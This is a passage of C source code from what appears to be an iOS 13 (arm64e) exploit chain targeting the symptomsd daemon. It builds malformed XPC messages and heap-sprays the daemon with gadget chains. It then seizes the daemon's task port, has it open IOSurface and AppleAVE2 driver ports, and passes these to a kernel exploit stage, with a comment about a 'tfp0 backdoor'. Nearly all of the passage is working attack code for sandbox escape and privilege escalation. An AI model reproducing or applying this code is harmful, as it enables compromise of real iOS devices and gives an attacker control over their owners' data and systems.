    *(uint16_t*)(payload_inner + 2) = 100; // v45
    // Do not let these pass: if ( v45 & 3 )
    //                        if ( payload_remain_len < v45 + 4 )    //payload_remain_len: payload_size - 72 - 4
    //                        if ( (unsigned int)v45 <= 11 )
    //                        if ( v47 + 8 > v45 )                   //v47: *(uint32_t*)(payload_inner + 8)
    *(uint32_t*)(payload_inner + 8) = 100 - 8; // provided EventKey max length
    *(uint32_t*)(payload_inner + 4) = 0xFFFFFFFF; // Must let it passes: if( _bittest((int*)(payload_inner + 4), 29u) )
    strcpy(payload_inner + 12, "com.apple.symptoms.test.request-passthrough");
    
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_data(msg, "payload", payload, payload_size);
    
    void *sprayData = NULL;
    
    if(boo){
        
        // Prepare spray data
        uint32_t sprayData_len = 0x20000;
        sprayData = malloc(sprayData_len);
        memset(sprayData, 0x0, sprayData_len);
        
        for(int i=0; i<sprayData_len; i=i+0x4000){
            char *each_page_spray = sprayData + i;
            
            /*
             Nowadays iOS device basically all have 0x4000 PAGE_SIZE, good for spray technique
             */
            
            if(boo == 1)
                Assemble_AOP((uint64_t*)each_page_spray, SPRAY_ADDRESS);
            if(boo == 2)
                Assemble_AOP2((uint64_t*)each_page_spray, SPRAY_ADDRESS);
        }
        
        
        
        xpc_object_t sprayarr = xpc_array_create(NULL, 0);
        xpc_object_t spraydata = xpc_data_create(sprayData, sprayData_len);
        
        for(int i=0; i<13000; i++){
            xpc_array_append_value(sprayarr, spraydata);
        }
        xpc_dictionary_set_value(msg, "spray", sprayarr); // Send the spray data along with the trigger msg
        
    }
    
    xpc_connection_send_message_with_reply(xpcconn, msg, dispatch_get_main_queue(), ^(xpc_object_t object) {
        //printf("replyB: %s\n", xpc_copy_description(object));
    });
    
    if(boo)
        free(sprayData);
}

#pragma mark - Pre-exploitation - Our Mach Server

mach_port_t our_serverport = 0;
void Prepare_our_Mach_server(){
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &our_serverport);
    if(our_serverport == 0){
        printf("Error occurred when mach_port_allocate: 0x%x!\n", kr);
        exit();
    }
}

mach_port_t symptomsd_bsport = 0;
uint32_t Retrieve_symptomsd_bootstrap_port(){
    if(symptomsd_bsport)
        return symptomsd_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE, &symptomsd_bsport);
    if(!symptomsd_bsport){
        printf("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE);
        return 0;
    }
    return symptomsd_bsport;
}

// For post-exploit achieve tfp0 backdoor
uint32_t Retrieve_midi_bootstrap_port(){
    uint32_t midi_port;
    bootstrap_look_up(bootstrap_port, "com.apple.midiserver", &midi_port);
    if(!midi_port){
        printf("%s bootstrap_look_up failed\n", "com.apple.midiserver");
        return 0;
    }
    return midi_port;
}

bool Send_our_serverport(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        mach_msg_port_descriptor_t our_task_port;
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.Head.msgh_id = 0x8888;
    msg.msgh_body.msgh_descriptor_count = 4;
    msg.our_recv_port.name = our_serverport;
    msg.our_recv_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.our_recv_port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.our_task_port.name = mach_task_self();
    msg.our_task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.our_task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    extern CFMutableDictionaryRef IOServiceMatching(const char *name);
    extern io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
    
    msg.IOSurfaceRoot_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    msg.IOSurfaceRoot_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.IOSurfaceRoot_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    msg.AppleAVE2Driver_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2Driver"));
    msg.AppleAVE2Driver_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.AppleAVE2Driver_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
    {
        // Check if our msg has been received yet
        bzero(&msg.Head, sizeof(msg));
        msg.Head.msgh_size = sizeof(msg);
        msg.Head.msgh_local_port = our_serverport;
        
        if(mach_msg(&msg.Head, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, msg.Head.msgh_size, msg.Head.msgh_local_port, 500, 0))
            return false;
    }
    
    return true;
}

mach_port_t Retrieve_symptomsd_task_port(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    int mrr = mach_msg_receive(&msg.Head);
    
    if(mrr != 0){
        printf("Error occurred when Reply_ioservice_handler(0x%x)\n", mrr);
        return 0;
    }
    return msg.port.name;
}

void Send_overwritting_iosurfaceMap(uint64_t remote_map_addr, uint64_t *local_map_addr){
    
    struct {
        mach_msg_header_t Head;
        uint64_t remote_map_addr;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    msg.remote_map_addr = remote_map_addr;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
    
    struct {
        mach_msg_header_t Head;
        uint64_t local_map_addr;
        mach_msg_trailer_t trailer;
    }msg2 = {0};
    msg2.Head.msgh_size = sizeof(msg2);
    msg2.Head.msgh_local_port = our_serverport;
    int rt = mach_msg_receive(&msg2.Head);
    
    printf("vm remap: 0x%x local_map_addr: 0x%llx\n", rt, msg2.local_map_addr);
    *local_map_addr = msg2.local_map_addr;
}

void Reply_notify_completion(){
    struct {
        mach_msg_header_t Head;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    mach_msg_receive(&msg.Head);
}

void Send_notify_msg(){
    struct {
        mach_msg_header_t Head;
    }msg = {0};
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_symptomsd_bootstrap_port();
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

uint64_t PACSupport_PACGA(uint64_t code_ptr, uint64_t modifier){
    
    __asm__ __volatile__(
                         "pacga    x0, x0, x1\n"
                         "mov    x18, x0\n"
                         "mov    %0, x18\n"
                         :"=r"(code_ptr));
    return code_ptr;
}

void test_thread(){
    
    arm_thread_state64_t state = {0};
    state.__opaque_pc = 0x6666666666666666;
    for(int i=0; i<29; i++){
        state.__x[i] = 0x6666666666666666;
    }
    thread_t th;
    thread_create_running(mach_task_self(), ARM_THREAD_STATE64, &state, ARM_THREAD_STATE64_COUNT, &th);
    
}

#define printf(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define printf2(X) {extern void log_toView(const char *input_cstr);log_toView(X);}

void exploit_start(){
    
    int kr = 0;
    
    if(setjmp(jmpb))
        return;
    
    extern void log_toView(const char *input_cstr);
    log_toView("+++++ ios13 pwn (arm64e) +++++\n");
    
    Find_aopGadgets_speed();
    Prepare_our_Mach_server();
    
    symptomsd_vuln_prepare1();
    symptomsd_vuln_prepare2(1);
    symptomsd_vuln_trigger(1);
    symptomsd_vuln_prepare2(0);
    symptomsd_vuln_trigger(0);
    symptomsd_vuln_trigger(0);
    symptomsd_vuln_trigger(0);
    symptomsd_vuln_trigger(0);
    
    symptomsd_vuln_trigger(2); // <== 6
    
    //extern void ppp();ppp();
    while(1){
        // loop here, waiting to be notified that they got the message
        usleep(5000);
        if(Send_our_serverport())
            break;
    }
    
    extern void ppp();ppp();
    task_t symptomsd_task = Retrieve_symptomsd_task_port();
    
    pid_t symptomsd_pid = 0;
    kr = pid_for_task(symptomsd_task, &symptomsd_pid);
    if(kr == KERN_SUCCESS){
        //extern void ppp();ppp();
    }
    else
    {//extern void ppp();ppp();
    }
    
    // Ask the unsandbox daemon which has been totally controlled at this moment
    // To open IO device ports, and passing to us for next stage kernel attacking.
    //extern void ppp();ppp();
    
    Reply_notify_completion(); // Waiting for pwned proc preparing port
    
    uint32_t IOSurfaceRootUserClient_port = 0;
    task_get_special_port(symptomsd_task, TASK_SEATBELT_PORT, &IOSurfaceRootUserClient_port);
    //extern void ppp();ppp();
    
    Send_notify_msg();
    Reply_notify_completion(); // Waiting preparing another port
    
    uint32_t AppleAVE2UserClient_port = 0;
    task_get_special_port(symptomsd_task, TASK_ACCESS_PORT, &AppleAVE2UserClient_port);

    printf2("1\n");
    
    void kernel_exp_start(uint32_t ave_ioconn, uint32_t surface_ioconn);
    kernel_exp_start(AppleAVE2UserClient_port, IOSurfaceRootUserClient_port);
}

#endif
